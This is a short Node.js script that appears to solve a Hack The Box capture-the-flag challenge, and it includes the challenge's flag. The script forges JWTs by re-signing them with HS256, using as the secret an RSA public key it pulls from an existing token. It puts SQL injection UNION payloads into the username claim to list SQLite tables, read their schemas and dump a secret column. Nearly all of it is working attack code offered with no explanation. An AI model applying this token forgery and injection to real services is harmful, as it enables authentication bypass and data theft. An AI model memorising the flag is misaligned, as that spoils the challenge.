'use strict'

const fs = require('fs')
const jwt = require('jsonwebtoken')

const TOKEN = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVtcCIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNTg4MDMxMX0.uINvWnToizEWjEZEK9ze_nVX5WGoHE9xUmLXdeHglGnQzJAJsjwIB4pEpOgp2WvNDX83-3BVZBjUhArhz-igi9wMgC-Q8q4Ht-mStyvli-F7z_6c83tSbDqaLtXyl0KsfC05yr4Kg1PTj5kt-8_yCAgj2CevD8IJ_9tT8PZ4cc4xC9qkPkLClrBpfUlDfrYqV1ov2XGadRQbiQDNWE9E1JhE4QRgfibloSpOdC7nziUmho57vBevTO_TULx8y_3PFN7braaMG9CCCx5Kt-YFerCIEZ3wBHW5OYrnXKOwAF1XVb4lv8CCyzC6SHOdq6uTTO0S34hUE8clK9RWmGDQLQ'
// @test const tableNames = () => "test' union select group_concat(tbl_name),2 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- -"
const tableNames = () => "test' union select 1,group_concat(tbl_name),3 from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- -"
// @test const columnNames = tableName => `test' union select sql,2 from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name='${tableName}' -- -`
const columnNames = tableName => `test' union select 1,sql,3 from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name='${tableName}' -- -`
// @test const columnData = (table, column) => `test' union select group_concat(${column}, '-'),2 from ${table} -- -`
const columnData = (table, column) => `test' union select 1,group_concat(${column}, '-'),3 from ${table} -- -`

const createToken = query => {
  const publicKey = extractPublicKey(TOKEN)
  // const publicKey = fs.readFileSync('./site/public.key')
  return jwt.sign({ username: query }, publicKey, { algorithm: 'HS256' })
}

const extractPublicKey = (jwt) => {
  const payload = Buffer.from(jwt.split('.')[1], 'base64').toString('ascii')
  return JSON.parse(payload).pk
}

console.log(createToken(columnData('flag_storage', 'top_secret_flaag')))

const FLAG = 'HTB{d0n7_3xp053_y0ur_publ1ck3y}'
// module.exports = {
//   createToken,
//   query: {
//     tableNames
//   }
// }
